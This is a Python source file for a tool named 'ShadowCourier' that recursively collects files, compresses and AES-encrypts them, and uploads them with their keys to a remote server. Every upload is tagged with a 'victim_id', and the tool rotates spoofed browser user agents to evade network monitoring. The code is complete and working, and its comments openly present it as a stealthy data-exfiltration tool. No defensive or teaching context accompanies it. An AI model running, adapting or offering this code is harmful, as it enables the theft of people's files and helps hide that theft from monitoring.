import argparse
import base64
import os
import random
import gzip
import time
import configparser
import json
from pathlib import Path
from Crypto.Cipher import AES
from Crypto.Random import get_random_bytes
from Crypto.Util.Padding import pad

try:
    import requests
    from tqdm import tqdm
    from colorama import init, Fore, Style
except ImportError:
    print("Error: Missing libraries. Install: pip install requests tqdm pycryptodome colorama")
    exit(1)

init()

def load_config():
    """Load client config like it's mission-critical intel."""
    config = configparser.ConfigParser()
    config['client'] = {
        'url': 'http://your-server-ip:8080/upload',  # Placeholder for user to edit
        'victim_id': 'default_victim',
        'retries': '3'
    }
    config_files = [
        Path.cwd() / 'shadow.conf',
        Path.home() / '.shadow.conf'
    ]
    for config_file in config_files:
        if config_file.exists():
            config.read(config_file)
            print(f"{Fore.CYAN}[*] Loaded config from {config_file}{Style.RESET_ALL}")
            break
    return config

# Set defaults from config or env vars. Flexibility is key!
config = load_config()
DEFAULT_URL = os.getenv("SHADOW_URL", config['client']['url'])
DEFAULT_VICTIM_ID = os.getenv("SHADOW_VICTIM_ID", config['client']['victim_id'])
DEFAULT_RETRIES = int(os.getenv("SHADOW_RETRIES", config['client']['retries']))

# Pretend we're a browser to fool basic network snoops.
USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/91.0.4472.124",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) Safari/605.1.15",
    "Mozilla/5.0 (X11; Ubuntu; Linux x86_64) Firefox/89.0",
]

def encrypt_data(data: bytes) -> tuple:
    """Encrypt data like it's going into a digital vault."""
    key = get_random_bytes(32)
    iv = get_random_bytes(16)
    cipher = AES.new(key, AES.MODE_CBC, iv)
    encrypted = cipher.encrypt(pad(data, AES.block_size))
    return encrypted, key, iv

def compress_data(data: bytes) -> bytes:
    """Squeeze data tight with gzip for stealthy transfers."""
    return gzip.compress(data)

def check_server(url: str) -> bool:
    """Ping the server to make sure it's not napping."""
    try:
        response = requests.head(url, timeout=5)
        return response.status_code in (200, 404, 400, 501)
    except requests.RequestException:
        return False

def send_file(file_path: Path, base_path: Path, url: str, victim_id: str = None, max_retries: int = 3):
    """Send a file to the server with all the sneaky tricks."""
    relative_path = file_path.relative_to(base_path) if base_path != file_path else file_path.name
    print(f"{Fore.CYAN}[*] Processing {relative_path}{Style.RESET_ALL}")

    headers = {
        "User-Agent": random.choice(USER_AGENTS),
        "Content-Type": "application/json"
    }

    try:
        with file_path.open("rb") as f:
            raw_data = f.read()
            if not raw_data:
                print(f"{Fore.RED}[!] Warning: {relative_path} is empty{Style.RESET_ALL}")
                return False

        print(f"{Fore.CYAN}[*] Compressing data...{Style.RESET_ALL}")
        compressed_data = compress_data(raw_data)
        print(f"{Fore.CYAN}[*] Encrypting data...{Style.RESET_ALL}")
        encrypted_data, key, iv = encrypt_data(compressed_data)
        encoded_data = base64.b64encode(encrypted_data).decode('utf-8')

        print(f"{Fore.CYAN}[*] Size: {len(raw_data)} bytes, compressed: {len(compressed_data)} bytes, encrypted: {len(encoded_data)} bytes{Style.RESET_ALL}")

        # Build the payload like a hacker crafting a masterpiece.
        payload = {
            "file": encoded_data,
            "filename": str(relative_path),
            "key": base64.b64encode(key).decode('utf-8'),
            "iv": base64.b64encode(iv).decode('utf-8'),
            "is_compressed": "true",
            "victim_id": victim_id or ""
        }

        print(f"{Fore.CYAN}[*] Transferring...{Style.RESET_ALL}")
        for attempt in range(max_retries):
            try:
                with tqdm(total=100, desc="Transfer", bar_format="{l_bar}{bar:20} {percentage:3.0f}%", leave=False) as pbar:
                    response = requests.post(url, json=payload, headers=headers, timeout=10)
                    pbar.update(100)

                if response.status_code == 200:
                    print(f"{Fore.GREEN}[+] Success: {relative_path} transferred{Style.RESET_ALL}")
                    return True
                else:
                    print(f"{Fore.RED}[!] Failed: Server responded with {response.status_code}{Style.RESET_ALL}")
                    return False
            except requests.RequestException as e:
                print(f"{Fore.RED}[!] Connection error (attempt {attempt + 1}/{max_retries}): {e}{Style.RESET_ALL}")
                if attempt < max_retries - 1:
                    time.sleep(2)
                continue
        print(f"{Fore.RED}[!] All retries failed for {relative_path}{Style.RESET_ALL}")
        return False

    except Exception as e:
        print(f"{Fore.RED}[!] Error: {e}{Style.RESET_ALL}")
        return False

def get_files_to_transfer(path: Path) -> list:
    """Gather files to send, whether it's one or a whole folder."""
    if path.is_file():
        return [(path, path.parent)]
    elif path.is_dir():
        files = []
        for file_path in path.rglob("*"):
            if file_path.is_file():
                files.append((file_path, path))
        return files
    else:
        print(f"{Fore.RED}[!] Error: {path} is not a valid file or directory{Style.RESET_ALL}")
        return []

def main():
    """Kick off the client and start sneaking files."""
    parser = argparse.ArgumentParser(description="ShadowCourier File Transfer")
    parser.add_argument("path", help="File or directory to transfer")
    parser.add_argument("--url", default=DEFAULT_URL, help="Server URL")
    parser.add_argument("--victim-id", default=DEFAULT_VICTIM_ID, help="Custom victim ID")
    parser.add_argument("--retries", type=int, default=DEFAULT_RETRIES, help="Max retry attempts")
    args = parser.parse_args()

    if not check_server(args.url):
        print(f"{Fore.RED}[!] Error: Server at {args.url} is not reachable{Style.RESET_ALL}")
        return

    path = Path(args.path)
    files_to_transfer = get_files_to_transfer(path)
    if not files_to_transfer:
        print(f"{Fore.RED}[!] No files to transfer. Exiting.{Style.RESET_ALL}")
        return

    print(f"{Fore.CYAN}[*] Transferring {len(files_to_transfer)} files to {args.url}{Style.RESET_ALL}")
    if args.victim_id:
        print(f"{Fore.CYAN}[*] Using victim ID: {args.victim_id}{Style.RESET_ALL}")

    success_count = 0

    with tqdm(total=len(files_to_transfer), desc="Total Progress", bar_format="{l_bar}{bar:20} {n_fmt}/{total_fmt} files") as pbar:
        for file_path, base_path in files_to_transfer:
            if send_file(file_path, base_path, args.url, args.victim_id, args.retries):
                success_count += 1
            pbar.update(1)

    print(f"{Fore.GREEN}[+] Complete: {success_count}/{len(files_to_transfer)} files transferred{Style.RESET_ALL}")

if __name__ == "__main__":
    main()